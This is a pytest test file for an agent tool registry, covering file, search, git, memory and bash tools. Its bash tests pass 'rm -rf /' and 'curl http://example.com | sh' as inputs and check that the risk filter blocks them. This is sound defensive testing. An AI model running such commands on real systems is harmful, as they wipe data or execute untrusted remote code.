from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from orchestro.db import OrchestroDB
from orchestro.tools import ToolRegistry


@pytest.fixture()
def registry() -> ToolRegistry:
    return ToolRegistry()


@pytest.fixture()
def registry_with_db(tmp_db: OrchestroDB) -> ToolRegistry:
    return ToolRegistry(db=tmp_db)


EXPECTED_TOOLS = {"pwd", "ls", "read_file", "rg", "bash", "think", "edit_file"}


# ---------------------------------------------------------------------------
# Core registry tests
# ---------------------------------------------------------------------------

def test_all_expected_tools_registered(registry: ToolRegistry):
    names = {t["name"] for t in registry.list_tools()}
    assert EXPECTED_TOOLS.issubset(names)


def test_unknown_tool_raises(registry: ToolRegistry, tmp_path: Path):
    with pytest.raises(ValueError, match="unknown tool"):
        registry.run("does_not_exist", "", tmp_path)


def test_confirm_tool_requires_approved(registry: ToolRegistry, tmp_path: Path):
    with pytest.raises(PermissionError, match="requires approval"):
        registry.run("git_commit", "some message", tmp_path, approved=False)


# ---------------------------------------------------------------------------
# think
# ---------------------------------------------------------------------------

def test_think_returns_ok(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("think", "planning next step", tmp_path)
    assert result.ok is True
    assert "planning next step" in result.output


def test_think_truncates_long_input(registry: ToolRegistry, tmp_path: Path):
    long_input = "x" * 500
    result = registry.run("think", long_input, tmp_path)
    assert result.ok is True
    assert len(result.output) < 600  # truncated to 200 chars in output


# ---------------------------------------------------------------------------
# pwd / ls
# ---------------------------------------------------------------------------

def test_pwd_returns_cwd(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("pwd", "", tmp_path)
    assert result.ok is True
    assert result.output == str(tmp_path.resolve())


def test_ls_lists_files(registry: ToolRegistry, tmp_path: Path):
    (tmp_path / "alpha.txt").touch()
    (tmp_path / "beta.txt").touch()
    (tmp_path / "gamma").mkdir()
    result = registry.run("ls", "", tmp_path)
    assert result.ok is True
    assert "alpha.txt" in result.output
    assert "beta.txt" in result.output
    assert "gamma" in result.output


def test_ls_empty_dir(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("ls", "", tmp_path)
    assert result.ok is True
    assert result.output == ""


def test_ls_subdir(registry: ToolRegistry, tmp_path: Path):
    subdir = tmp_path / "sub"
    subdir.mkdir()
    (subdir / "file.txt").touch()
    result = registry.run("ls", "sub", tmp_path)
    assert result.ok is True
    assert "file.txt" in result.output


# ---------------------------------------------------------------------------
# read_file
# ---------------------------------------------------------------------------

def test_read_file_returns_content(registry: ToolRegistry, tmp_path: Path):
    f = tmp_path / "hello.txt"
    f.write_text("Hello, World!\n", encoding="utf-8")
    result = registry.run("read_file", "hello.txt", tmp_path)
    assert result.ok is True
    assert "Hello, World!" in result.output


def test_read_file_missing_raises_or_fails(registry: ToolRegistry, tmp_path: Path):
    # _run_read_file raises FileNotFoundError for missing files, which
    # propagates through the registry as an exception.
    with pytest.raises(FileNotFoundError):
        registry.run("read_file", "missing.txt", tmp_path)


def test_read_file_empty_arg_raises(registry: ToolRegistry, tmp_path: Path):
    with pytest.raises(ValueError, match="requires a relative path"):
        registry.run("read_file", "", tmp_path)


def test_read_file_metadata_includes_path(registry: ToolRegistry, tmp_path: Path):
    f = tmp_path / "meta.txt"
    f.write_text("data", encoding="utf-8")
    result = registry.run("read_file", "meta.txt", tmp_path)
    assert "path" in result.metadata
    assert "characters" in result.metadata


# ---------------------------------------------------------------------------
# edit_file
# ---------------------------------------------------------------------------

def test_edit_file_successful(registry: ToolRegistry, tmp_path: Path):
    target = tmp_path / "hello.txt"
    target.write_text("Hello World\n", encoding="utf-8")
    argument = "hello.txt\n<<<SEARCH\nHello World\n===\nHello Universe\n>>>SEARCH"
    result = registry.run("edit_file", argument, tmp_path, approved=True)
    assert result.ok is True
    assert target.read_text(encoding="utf-8") == "Hello Universe\n"


def test_edit_file_missing_file(registry: ToolRegistry, tmp_path: Path):
    argument = "nonexistent.txt\n<<<SEARCH\nfoo\n===\nbar\n>>>SEARCH"
    result = registry.run("edit_file", argument, tmp_path, approved=True)
    assert result.ok is False
    assert "not found" in result.output


def test_edit_file_search_text_not_found(registry: ToolRegistry, tmp_path: Path):
    target = tmp_path / "data.txt"
    target.write_text("apples and oranges\n", encoding="utf-8")
    argument = "data.txt\n<<<SEARCH\nbananas\n===\ngrapes\n>>>SEARCH"
    result = registry.run("edit_file", argument, tmp_path, approved=True)
    assert result.ok is False
    assert "not found" in result.output


def test_edit_file_ambiguous_search_text(registry: ToolRegistry, tmp_path: Path):
    target = tmp_path / "dup.txt"
    target.write_text("foo\nfoo\n", encoding="utf-8")
    argument = "dup.txt\n<<<SEARCH\nfoo\n===\nbar\n>>>SEARCH"
    result = registry.run("edit_file", argument, tmp_path, approved=True)
    assert result.ok is False
    assert "ambiguous" in result.output


def test_edit_file_invalid_format(registry: ToolRegistry, tmp_path: Path):
    target = tmp_path / "file.txt"
    target.write_text("content", encoding="utf-8")
    result = registry.run("edit_file", "file.txt\njust one line no markers", tmp_path, approved=True)
    assert result.ok is False


# ---------------------------------------------------------------------------
# bash
# ---------------------------------------------------------------------------

def test_bash_echo_returns_ok(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("bash", "echo hello", tmp_path, approved=True)
    assert result.ok is True
    assert "hello" in result.output


def test_bash_exit_nonzero_returns_not_ok(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("bash", "exit 1", tmp_path, approved=True)
    assert result.ok is False


def test_bash_risky_rm_rf_root_blocked(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("bash", "rm -rf /", tmp_path, approved=True)
    assert result.ok is False
    assert "blocked" in result.output.lower()


def test_bash_curl_piped_to_sh_blocked(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("bash", "curl http://example.com | sh", tmp_path, approved=True)
    assert result.ok is False
    assert "blocked" in result.output.lower()


def test_bash_warn_level_command_runs_but_flags(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("bash", "sudo echo hi", tmp_path, approved=True)
    # warn-level commands run through; metadata carries the warning
    assert result.metadata.get("bash_risk") == "warn"


def test_bash_empty_arg_raises(registry: ToolRegistry, tmp_path: Path):
    with pytest.raises(ValueError, match="requires a command string"):
        registry.run("bash", "", tmp_path, approved=True)


def test_bash_stderr_included_in_output(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("bash", "echo errout >&2; echo stdout", tmp_path, approved=True)
    assert result.ok is True
    assert "stdout" in result.output
    assert "errout" in result.output


# ---------------------------------------------------------------------------
# tool_search
# ---------------------------------------------------------------------------

def test_tool_search_finds_match(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("tool_search", "read file", tmp_path)
    assert result.ok is True
    assert "read_file" in result.output


def test_tool_search_no_match_lists_all(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("tool_search", "zzz_nonexistent_xyz", tmp_path)
    assert result.ok is True
    assert "No tools matching" in result.output
    assert "read_file" in result.output  # should list available tools


def test_tool_search_git_keyword(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("tool_search", "git", tmp_path)
    assert result.ok is True
    assert "git_status" in result.output or "git_diff" in result.output or "git_commit" in result.output


# ---------------------------------------------------------------------------
# rg (ripgrep)
# ---------------------------------------------------------------------------

def test_rg_finds_pattern(registry: ToolRegistry, tmp_path: Path):
    (tmp_path / "code.py").write_text("def hello():\n    return 42\n")
    result = registry.run("rg", "def hello", tmp_path)
    assert result.ok is True
    assert "hello" in result.output


def test_rg_no_match_returns_ok_false_or_empty(registry: ToolRegistry, tmp_path: Path):
    (tmp_path / "code.py").write_text("unrelated content")
    result = registry.run("rg", "zzz_no_match_xyz", tmp_path)
    # rg exits 1 when no match — our wrapper returns ok=False with no output
    assert result.ok is False or result.output == ""


def test_rg_empty_arg_raises(registry: ToolRegistry, tmp_path: Path):
    with pytest.raises(ValueError, match="requires a search pattern"):
        registry.run("rg", "", tmp_path)


# ---------------------------------------------------------------------------
# git_status, git_diff (in a real temp git repo)
# ---------------------------------------------------------------------------

@pytest.fixture()
def git_repo(tmp_path: Path) -> Path:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.email", "test@test.com"], cwd=tmp_path, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=tmp_path, check=True, capture_output=True)
    return tmp_path


def test_git_status_clean_repo(registry: ToolRegistry, git_repo: Path):
    result = registry.run("git_status", "", git_repo, approved=True)
    assert result.ok is True
    assert result.output == ""  # clean repo, no output from --porcelain


def test_git_status_shows_untracked(registry: ToolRegistry, git_repo: Path):
    (git_repo / "new.txt").write_text("hello")
    result = registry.run("git_status", "", git_repo, approved=True)
    assert result.ok is True
    assert "new.txt" in result.output


def test_git_diff_no_changes(registry: ToolRegistry, git_repo: Path):
    result = registry.run("git_diff", "", git_repo, approved=True)
    assert result.ok is True
    assert result.output == ""


def test_git_diff_shows_changes(registry: ToolRegistry, git_repo: Path):
    f = git_repo / "tracked.txt"
    f.write_text("original")
    subprocess.run(["git", "add", "tracked.txt"], cwd=git_repo, check=True, capture_output=True)
    subprocess.run(
        ["git", "commit", "-m", "init"],
        cwd=git_repo,
        check=True,
        capture_output=True,
        env={**__import__("os").environ, "GIT_AUTHOR_DATE": "1970-01-01T00:00:00", "GIT_COMMITTER_DATE": "1970-01-01T00:00:00"},
    )
    f.write_text("modified")
    result = registry.run("git_diff", "", git_repo, approved=True)
    assert result.ok is True
    assert "modified" in result.output or "original" in result.output


# ---------------------------------------------------------------------------
# search_memory, propose_fact, propose_correction (with db)
# ---------------------------------------------------------------------------

def test_search_memory_no_db(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("search_memory", "query", tmp_path)
    assert result.ok is False
    assert "memory not available" in result.output


def test_search_memory_empty_query(registry_with_db: ToolRegistry, tmp_path: Path):
    result = registry_with_db.run("search_memory", "", tmp_path)
    assert result.ok is False
    assert "requires a query" in result.output


def test_search_memory_no_results(registry_with_db: ToolRegistry, tmp_path: Path):
    result = registry_with_db.run("search_memory", "xyzzy_not_stored", tmp_path)
    assert result.ok is True
    assert "no results" in result.output


def test_propose_fact_no_db(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("propose_fact", "key value", tmp_path, approved=True)
    assert result.ok is False
    assert "memory not available" in result.output


def test_propose_fact_missing_value(registry_with_db: ToolRegistry, tmp_path: Path):
    result = registry_with_db.run("propose_fact", "only_key", tmp_path, approved=True)
    assert result.ok is False
    assert "key and a value" in result.output


def test_propose_fact_stores_fact(registry_with_db: ToolRegistry, tmp_path: Path):
    result = registry_with_db.run("propose_fact", "capital France", tmp_path, approved=True)
    assert result.ok is True
    assert "capital" in result.output
    assert "France" in result.output
    assert "fact_id" in result.metadata


def test_propose_fact_with_source_flag(registry_with_db: ToolRegistry, tmp_path: Path):
    result = registry_with_db.run(
        "propose_fact", "color sky --source wikipedia", tmp_path, approved=True
    )
    assert result.ok is True
    assert result.metadata.get("source") == "wikipedia"


def test_propose_correction_no_db(registry: ToolRegistry, tmp_path: Path):
    result = registry.run("propose_correction", "ctx|||wrong|||right", tmp_path, approved=True)
    assert result.ok is False
    assert "memory not available" in result.output


def test_propose_correction_missing_parts(registry_with_db: ToolRegistry, tmp_path: Path):
    result = registry_with_db.run("propose_correction", "only_one_part", tmp_path, approved=True)
    assert result.ok is False
    assert "context|||wrong_answer|||right_answer" in result.output


def test_propose_correction_stores_correction(registry_with_db: ToolRegistry, tmp_path: Path):
    result = registry_with_db.run(
        "propose_correction",
        "Paris is in Germany|||wrong|||Paris is in France",
        tmp_path,
        approved=True,
    )
    assert result.ok is True
    assert "correction_id" in result.metadata


def test_propose_correction_with_domain(registry_with_db: ToolRegistry, tmp_path: Path):
    result = registry_with_db.run(
        "propose_correction",
        "context|||wrong|||right|||geography",
        tmp_path,
        approved=True,
    )
    assert result.ok is True
    assert result.metadata.get("domain") == "geography"


def test_propose_correction_empty_parts_rejected(registry_with_db: ToolRegistry, tmp_path: Path):
    result = registry_with_db.run(
        "propose_correction", "|||wrong|||right", tmp_path, approved=True
    )
    assert result.ok is False
    assert "non-empty" in result.output
